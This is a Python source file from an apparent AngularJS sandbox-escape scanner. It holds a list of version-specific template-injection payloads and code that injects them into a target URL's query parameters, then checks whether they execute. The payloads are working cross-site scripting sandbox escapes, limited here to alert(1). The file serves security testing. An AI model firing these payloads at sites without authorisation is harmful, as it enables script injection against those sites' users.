# MIT License
# 
# Copyright (c) 2017 Tijme Gommers
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from urllib.parse import urlparse, urlencode, parse_qs, quote_plus
from urllib.request import urlopen
from bs4 import BeautifulSoup
from classes.Selenium import Selenium
from classes.Logging import Logging

import copy

"""
This class checks if certain websites are vulnerable for AngularJS sandbox escapes.
"""
class Exploit:

    """
    Keep track of the Exploit instance
    """
    _instance = None

    """
    The AngularJS payloads to test
    """
    _payloads = [
        {
            "min": "1.0.1",
            "max": "1.1.5",
            "value": "{{constructor.constructor('alert(1)')()}}"
        },
        {
            "min": "1.2.0",
            "max": "1.2.1",
            "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.2",
            "max": "1.2.5",
            "value": "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}"
        },
        {
            "min": "1.2.6",
            "max": "1.2.18",
            "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.19",
            "max": "1.2.23",
            "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}"
        },
        {
            "min": "1.2.24",
            "max": "1.2.29",
            "value": "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}"
        },

# TODO
# Add payload for 1.3.0

        {
            "min": "1.3.1",
            "max": "1.3.2",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.3",
            "max": "1.3.18",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.19",
            "max": "1.3.19",
            "value": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.20",
            "max": "1.3.20",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
        },
        {
            "min": "1.4.0",
            "max": "1.4.9",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}}};alert(1)//');}}"
        },
        {
            "min": "1.5.0",
            "max": "1.5.8",
            "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
        },

# TODO
# Add payload for 1.5.9 - 1.5.11

        {
            "min": "1.6.0",
            "max": "1.6.1",
            "value": "{{[].pop.constructor('alert(1)')()}}"
        }
    ]

    """
    Check if the given URL is vulnerable for an AngularJS sandbox escape for the given AngularJS version
    If use JavaScript engine is True, this class will ensure the alert is really popped using a JavaScript engine.
    """
    def is_vulnerable(self, url, version, use_javascript_engine=False):
        params = self.get_params(url)

        for param in params:
            for payload in self.get_payloads(version):
                payload_params = copy.deepcopy(params)
                del payload_params[param]
                payload_params = urlencode(payload_params, doseq=True)

                host_url = url.split('?')[0]
                full_url = host_url + "?" + payload_params

                if len(payload_params) > 0:
                    full_url = full_url + "&"

                full_urls = [
                    full_url + param + "=" + payload["value"],
                    full_url + param + "=" + quote_plus(payload["value"])
                ]

                for full_url in full_urls:
                    #Logging.yellow("Testing payload: {}".format(full_url))

                    contents = self.get_contents(full_url)

                    if not self.is_reflected(contents, payload):
                        continue

                    if not self.in_angular_scope(contents, payload):
                        continue

                    if use_javascript_engine and not Selenium.get_instance().alert_is_popped(full_url):
                        continue

                    return full_url

        return False

    """
    Get all the query params in the given URL
    """
    def get_params(self, url):
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    """
    Get all valid payloads for the given version
    """
    def get_payloads(self, version):
        requested_payloads = []

        for payload in self._payloads:
            req_major, req_minor, req_patch = version.split(".")
            min_major, min_minor, min_patch = payload["min"].split(".")
            max_major, max_minor, max_patch = payload["max"].split(".")

            if req_major > max_major or req_major < min_major:
                continue

            if req_minor > max_minor or req_minor < min_minor:
                continue

            if req_patch > max_patch or req_patch < min_patch:
                continue

            requested_payloads.append(payload)

        return requested_payloads

    """
    Get the contents of the given URL
    """
    def get_contents(self, url):
        return urlopen(url).read().decode("utf-8")

    """
    Check if the given payload was reflected in the contents
    """
    def is_reflected(self, contents, payload):
        return payload['value'] in contents

    """
    Check if the given payload is within an AngularJS scope
    """
    def in_angular_scope(self, contents, payload):
        soup = BeautifulSoup(contents, "html.parser")
        ng_app_contents = str(soup.select("[ng-app]"))

        return payload['value'] in ng_app_contents

    """
    Get the Exploit instance
    """
    def get_instance():
        if Exploit._instance == None:
            Exploit._instance = Exploit()

        return Exploit._instance

    get_instance = staticmethod(get_instance)